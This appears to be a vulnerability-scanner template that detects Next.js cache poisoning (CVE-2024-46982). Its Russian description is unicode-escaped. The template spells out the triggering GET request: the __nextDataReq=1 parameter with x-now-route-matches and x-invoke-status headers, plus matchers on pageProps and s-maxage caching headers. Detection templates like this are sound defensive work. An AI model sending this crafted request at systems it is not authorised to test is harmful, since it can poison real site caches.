id: nextjs-cache-poisoning
info:
  author: d00m_r34p3r
  description: "\u0428\u0430\u0431\u043B\u043E\u043D \u043F\u0440\u043E\u0432\u0435\
    \u0440\u044F\u0435\u0442, \u0438\u0437\u043C\u0435\u043D\u044F\u0435\u0442\u0441\
    \u044F \u043B\u0438 \u043E\u0442\u0432\u0435\u0442 \u0441\u0435\u0440\u0432\u0435\
    \u0440\u0430 \u043F\u0440\u0438 \u0438\u0441\u043F\u043E\u043B\u044C\u0437\u043E\
    \u0432\u0430\u043D\u0438\u0438 \u043F\u0430\u0440\u0430\u043C\u0435\u0442\u0440\
    \u0430 `__nextDataReq=1`\n\u0432\u043C\u0435\u0441\u0442\u0435 \u0441 \u0437\u0430\
    \u0433\u043E\u043B\u043E\u0432\u043A\u043E\u043C `x-now-route-matches: 1`. \u0415\
    \u0441\u043B\u0438 \u0432 \u043E\u0442\u0432\u0435\u0442\u0435 \u043E\u0431\u043D\
    \u0430\u0440\u0443\u0436\u0438\u0432\u0430\u0435\u0442\u0441\u044F JSON \u0441\
    \ \u043A\u043B\u044E\u0447\u043E\u043C `pageProps`\n\u0438 \u0437\u0430\u0433\u043E\
    \u043B\u043E\u0432\u043E\u043A Cache-Control \u0432\u043A\u043B\u044E\u0447\u0430\
    \u0435\u0442 \u0434\u0438\u0440\u0435\u043A\u0442\u0438\u0432\u044B `s-maxage=1`\
    \ \u0438 `stale-while-revalidate`, \u044D\u0442\u043E \u043C\u043E\u0436\u0435\
    \u0442 \u0441\u0432\u0438\u0434\u0435\u0442\u0435\u043B\u044C\u0441\u0442\u0432\
    \u043E\u0432\u0430\u0442\u044C \u043E\n\u0432\u043E\u0437\u043C\u043E\u0436\u043D\
    \u043E\u0441\u0442\u0438 \u043F\u0440\u0438\u043D\u0443\u0434\u0438\u0442\u0435\
    \u043B\u044C\u043D\u043E\u0433\u043E \u043A\u0435\u0448\u0438\u0440\u043E\u0432\
    \u0430\u043D\u0438\u044F SSR-\u043E\u0442\u0432\u0435\u0442\u0430 \u043A\u0430\
    \u043A SSG.\n\n\u0412\u0410\u0416\u041D\u041E: PoC \u043E\u0442\u043F\u0440\u0430\
    \u0432\u043B\u044F\u0435\u0442 \u0442\u043E\u043B\u044C\u043A\u043E \u0431\u0435\
    \u0437\u043E\u043F\u0430\u0441\u043D\u044B\u0435 GET-\u0437\u0430\u043F\u0440\u043E\
    \u0441\u044B \u0438 \u043D\u0435 \u043C\u043E\u0434\u0438\u0444\u0438\u0446\u0438\
    \u0440\u0443\u0435\u0442 \u0441\u043E\u0434\u0435\u0440\u0436\u0438\u043C\u043E\
    \u0435 \u0441\u0430\u0439\u0442\u0430.\n"
  name: Next.js Cache Poisoning Detection (CVE-2024-46982)
  reference:
  - https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir
  severity: high
  tags: nextjs, cache, cache-poisoning, cve, poc
requests:
- headers:
    x-invoke-status: '200'
    x-now-route-matches: '1'
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - pageProps
  - part: header
    type: word
    words:
    - s-maxage=1
  - part: header
    type: word
    words:
    - stale-while-revalidate
  method: GET
  path:
  - '{{BaseURL}}/poc?__nextDataReq=1'
